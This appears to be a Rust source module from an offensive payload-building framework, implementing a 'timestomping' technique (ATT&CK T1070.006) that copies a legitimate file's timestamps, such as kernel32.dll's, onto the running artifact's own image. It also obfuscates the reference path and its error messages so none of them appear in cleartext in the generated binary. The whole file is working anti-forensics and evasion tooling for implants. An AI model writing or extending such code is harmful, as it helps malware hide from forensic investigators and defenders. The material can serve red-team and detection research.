//! Timestomping.
//!
//! Copies the creation, last-access and last-write timestamps of a legitimate
//! reference file onto a target file (the running artifact's own image by
//! default), so the artifact looks like it has been on disk as long as the
//! reference. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for timestomping.
///
/// The reference path is a per-build string (obfuscated through
/// `StringsConfig`); the target path is optional and falls back to the running
/// artifact's own image path at run time.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Target file to stomp. `None` = the running artifact's own image path.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub target: Option<String>,
    /// Legitimate file whose timestamps are copied onto the target.
    pub reference: String,
}

impl Default for Params {
    /// Defaults to no target (the running image) and an empty reference.
    ///
    /// The manual impl keeps `Params::default()` and the `serde` field defaults
    /// in step; `reference` has no serde default, so a plan must name it.
    fn default() -> Self {
        Self {
            target: None,
            reference: String::new(),
        }
    }
}

/// Static metadata for timestomping.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "timestomping",
    attck: &["T1070.006"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/timestomping/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: r#"technique: timestomping
params:
  reference: "C:\\Windows\\System32\\kernel32.dll""#,
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the text
/// at run time (using `strings`'s active strategy), so no diagnostic lands in
/// the artifact's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_SELF_PATH_FAILED$",
        "could not determine the running image's path",
    ),
    ("$MSG_OPEN_REF_FAILED$", "could not open the reference file"),
    ("$MSG_OPEN_TARGET_FAILED$", "could not open the target file"),
    (
        "$MSG_GET_TIME_FAILED$",
        "could not read the reference file's timestamps",
    ),
    (
        "$MSG_SET_TIME_FAILED$",
        "could not set the target file's timestamps",
    ),
];

impl Params {
    /// Renders the timestomping stub fragment for these parameters.
    ///
    /// The reference path and (when set) the target path are rebuilt at run
    /// time from `strings`'s obfuscated bytes, and every diagnostic goes through
    /// a message placeholder, so none of them appears in the generated stub in
    /// cleartext.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let reference_def = strings
            .obfuscate(&self.reference)
            .render_stub_expr("stomp_reference");
        let target_def = match &self.target {
            Some(path) => format!(
                "Some({})",
                strings.obfuscate(path).render_stub_expr("stomp_target")
            ),
            None => "None".to_string(),
        };

        let mut rendered = DEF
            .stub_fragment
            .replace("$REFERENCE_DEF$", &reference_def)
            .replace("$TARGET_DEF$", &target_def);
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("timestomping_msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
